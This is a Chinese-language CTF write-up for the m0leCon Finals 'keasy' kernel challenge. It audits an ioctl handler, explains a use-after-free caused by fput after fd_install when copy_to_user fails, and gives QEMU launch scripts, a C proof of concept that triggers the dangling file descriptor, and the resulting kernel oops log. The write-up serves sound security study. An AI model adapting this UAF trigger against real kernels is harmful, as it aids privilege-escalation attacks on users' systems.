# CTF Kernel UAF Write

# 0x01.缓解措施
KASLR, SMAP, SMEP, and KPTI 全部开启
```shell
#!/bin/sh
qemu-system-x86_64 \
    -kernel bzImage \
    -cpu qemu64,+smep,+smap,+rdrand \
    -m 4G \
    -smp 4 \
    -initrd rootfs.cpio.gz \
    -hda flag.txt \
    -append "console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on page_alloc.shuffle=1 kaslr" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -gdb tcp::12345
```

# 0x02.源码审计

定义了 ioctl 处理程序的内核模块正在系统上运行。该处理程序定义为以下函数：
```c
static long keasy_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
	long ret = -EINVAL;
	struct file *myfile;
	int fd;

	if (!enabled) {
		goto out;
	}
	enabled = 0;

    myfile = anon_inode_getfile("[easy]", &keasy_file_fops, NULL, 0);

    fd = get_unused_fd_flags(O_CLOEXEC);
    if (fd < 0) {
        ret = fd;
        goto err;
    }

    fd_install(fd, myfile);

	if (copy_to_user((unsigned int __user *)arg, &fd, sizeof(fd))) {
		ret = -EINVAL;
		goto err;
	}

	ret = 0;
    return ret;

err:
    fput(myfile);
out:
	return ret;
}4
```

它创建一个名为 [easy] 的匿名文件，并为其分配一个文件描述符。一旦分配了文件描述符，该数字将被复制到用户态缓冲区。 该功能只能在启动后调用一次*2。

# 0x03.漏洞成因

如果在 fd_install 分配文件描述符后 copy_to_user 失败，则执行将转到 err 并调用 fput。  fput 减少文件的引用计数。 在这种情况下，计数器将变为零，因为匿名文件未共享，并且为该文件分配的结构将被释放。

这意味着如果 copy_to_user 失败，则会发生释放后使用，因为文件本身在文件描述符在用户空间中处于活动状态时已被释放。

# 0x04.验证BUG

编写POC代码

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}
int main() {
  // Open vulnerable device
  int fd = open("/dev/keasy", O_RDWR);
  if (fd == -1)
    fatal("/dev/keasy");
  // Get dangling file descriptor
  int ezfd = fd + 1;
  if (ioctl(fd, 0, 0xdeadbeef) == 0)
    fatal("ioctl did not fail");
  // Use-after-free
  char buf[4];
  read(ezfd, buf, 4);
  return 0;
}

```

编译POC为静态可执行程序

```shell
gcc poc.c -o poc --static
```

使用`tools/packaging_script.sh`的脚本将根目录重新打包

```shell
root@dppzuw0t7qpab:~/kernel_research/tools# ./packaging_script.sh ~/kernel_research/ctf/m0leCon_CTF_Finals/keasy/challenge/rootfs.cpio.gz ~/kernel_research/ctf/m0leCon_CTF_Finals/keasy/challenge/poc_rootfs.cpio.gz ~/kernel_research/ctf/m0leCon_CTF_Finals/keasy/solved-by-smile/poc
```

修改`challenge`文件夹下的`run.sh`根镜像的名称为`poc_rootfs.cpio.gz`

```shell
#!/bin/sh
qemu-system-x86_64 \
    -kernel bzImage \
    -cpu qemu64,+smep,+smap,+rdrand \
    -m 4G \
    -smp 4 \
    -initrd poc_rootfs.cpio.gz \
    -hda flag.txt \
    -append "console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on page_alloc.shuffle=1 kaslr" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    # -gdb tcp::12345
```

根路径下运行`poc`程序，触发`UAF`漏洞(空指针引用)

```shell
Good luck... 🤓
sh: can't access tty; job control turned off
~ $ poc
[   14.919463] BUG: kernel NULL pointer dereference, address: 00000000
[   14.919708] #PF: supervisor read access in kernel mode
[   14.919708] #PF: error_code(0x0000) - not-present page
[   14.919708] PGD 800000012bad0067 P4D 800000012bad0067 PUD 12bad506 
[   14.919708] Oops: 0000 [#1] PREEMPT SMP PTI
[   14.919708] CPU: 0 PID: 125 Comm: poc Tainted: G           O      3
[   14.919708] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),4
[   14.919708] RIP: 0010:selinux_file_permission+0x9f/0x1a0
[   14.919708] Code: c0 74 1e 4d 85 e4 0f 84 f9 00 00 00 4d 01 ec 41 0
[   14.919708] RSP: 0018:ffffb3208039fde0 EFLAGS: 00000246
[   14.919708] RAX: 0000000000000000 RBX: ffff9555a019a200 RCX: 000000
[   14.919708] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff90
[   14.919708] RBP: 0000000000000004 R08: ffff9555a0204740 R09: 000000
[   14.919708] R10: 0000000000000000 R11: ffffffffb37ed740 R12: ffff98
[   14.919708] R13: 0000000000000010 R14: ffff955580445110 R15: 000001
[   14.919708] FS:  0000000001278880(0000) GS:ffff9555bbc00000(0000) 0
[   14.919708] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   14.919708] CR2: 0000000000000000 CR3: 000000012b868000 CR4: 000000
[   14.919708] Call Trace:
[   14.919708]  <TASK>
[   14.919708]  ? __die_body+0x5f/0xb0
[   14.919708]  ? page_fault_oops+0x29d/0x3c0
[   14.919708]  ? copy_user_enhanced_fast_string+0x27/0x50
[   14.919708]  ? do_user_addr_fault+0x54e/0x5f0
[   14.919708]  ? expand_downwards+0x326/0x3e0
[   14.919708]  ? exc_page_fault+0x5d/0xa0
[   14.919708]  ? asm_exc_page_fault+0x22/0x30
[   14.919708]  ? __cfi_selinux_file_permission+0x10/0x10
[   14.919708]  ? selinux_file_permission+0x9f/0x1a0
[   14.919708]  security_file_permission+0x36/0x60
[   14.919708]  vfs_read+0xa0/0x2c0
[   14.919708]  ? call_rcu+0xe0/0x250
[   14.919708]  ksys_read+0x69/0xd0
[   14.919708]  do_syscall_64+0x52/0xa0
[   14.919708]  ? exit_to_user_mode_prepare+0x2a/0x80
[   14.919708]  entry_SYSCALL_64_after_hwframe+0x64/0xce
```